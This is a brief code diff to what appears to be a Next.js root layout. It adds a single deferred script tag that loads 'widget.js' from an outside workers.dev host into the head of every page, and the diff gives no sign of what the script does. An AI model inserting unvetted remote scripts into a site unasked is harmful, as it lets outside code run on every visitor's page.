@@ -58,6 +58,7 @@ export default function RootLayout({
             `,
           }}
         />
+        <script src="https://app-launcher.klawd.workers.dev/widget.js" defer />
       </head>
       <body className={`${geistSans.variable} ${geistMono.variable} antialiased`}>
         {children}
